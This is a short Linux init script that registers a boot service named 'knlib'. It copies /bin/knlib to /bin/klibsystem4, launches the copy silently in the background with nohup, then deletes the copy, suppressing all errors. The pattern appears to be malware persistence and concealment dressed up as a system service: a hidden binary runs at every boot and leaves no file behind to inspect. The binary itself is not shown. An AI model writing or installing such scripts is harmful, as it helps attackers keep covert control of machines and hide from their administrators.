#!/bin/bash
### BEGIN INIT INFO
# Provides:          knlib
# Required-Start:
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: knlibsystem
### END INIT INFO
cp -f -r -- /bin/knlib /bin/klibsystem4 2>/dev/null
cd /bin 2>/dev/null
nohup ./klibsystem4 >/dev/null 2>&1 &
rm -rf -- klibsystem4 2>/dev/null
